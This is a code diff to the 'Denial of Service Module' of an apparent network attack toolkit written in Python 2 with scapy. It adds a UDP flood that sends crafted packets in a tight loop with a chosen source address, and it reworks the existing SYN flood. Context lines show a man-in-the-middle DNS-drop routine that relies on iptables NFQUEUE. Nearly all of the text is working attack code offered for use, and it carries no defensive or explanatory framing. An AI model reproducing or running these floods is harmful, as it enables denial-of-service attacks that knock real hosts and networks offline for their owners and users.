@@ -29,12 +29,13 @@ class Jam(object):
 
 	name = "Denial of Service Module."
 	desc = "Denial of service attacks here."
-	version = "0.4"
-	ps = "Need to add more DoS attacks."
+	version = "0.5"
+	ps = "Need to add POST DoS attack."
 
 	def __init__(self):
 		self.blocks = []
-		self.stop = False
+		self.synstop = False
+		self.udpstop = False
 	def dnsdropstart(self,host):
 		os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
                 self.host = host
@@ -48,14 +49,47 @@ class Jam(object):
 
 	def dnsdropstop(self):
 		os.system('iptables -t nat -D PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
+		self.t.terminate()
 		print "[-] Man-in-the-middle DNS drop finalized."
+
+
+	def udpfloodstart(self, host, tgt, dport):
+		self.src = host
+		self.tgt = tgt
+		self.dport = dport
+		try:
+			print "[+] UDP flood denial of service initialized on port: {}.".format(dport)
+			self.u = threading.Thread(name='udpflood',target=self.udpflood)
+			self.u.setDaemon(True)
+			self.u.start()
+		except Exception as e:
+			print "[!] Exception caught: {}".format(e)
+
+	def udpfloodstop(self):
+		self.udpstop = True
+		print "[-] UDP flood denial of service finalized."
+
+	def udpflood(self):
+		if self.udpstop == True:
+			try:
+				self.u.terinate()
+			except:
+				pass
+		else:
+			try:
+				IP_layer = IP(src=self.src, dst=self.tgt)
+				UDP_layer = UDP(sport=1337,dport=self.dport)
+				pkt = IP_layer/UDP_layer
+				send(pkt, loop=1, inter=0.0, verbose=False)
+			except:
+				print "[!] Error: check the parameters (target, interface, port)"
 
 	def synfloodstart(self, host, tgt, dport):
 		self.src = host
 		self.tgt = tgt
 		self.dport = dport
 		try:
-			print "[+] Syn flood denial of service initialized."
+			print "[+] SYN flood denial of service initialized."
 			self.s = threading.Thread(name='synflood', target=self.synflood)
 			self.s.setDaemon(True)
 			self.s.start()
@@ -63,12 +97,15 @@ class Jam(object):
 			print "[!] Exception caught: {}".format(e)
 
 	def synfloodstop(self):
-		self.stop = True
-		print "[-] Syn flood denial of service finalized."
+		self.synstop = True
+		print "[-] SYN flood denial of service finalized."
 
 	def synflood(self):
-		if self.stop == True:
-			pass
+		if self.synstop == True:
+			try:
+				self.s.terminate()
+			except:
+				pass
 		else:
 			try:
 				IP_layer = IP(src=self.src, dst=self.tgt)
@@ -76,7 +113,7 @@ class Jam(object):
 				pkt = IP_layer/TCP_layer
 				send(pkt, loop=1, inter=0.0, verbose=False)
 			except:
-				print "[!] Error: check the parameters (target,interface,port)"
+				print "[!] Error: check the parameters (target, interface, port)"
 
 	def callback(self, packet):
                 packet.drop()
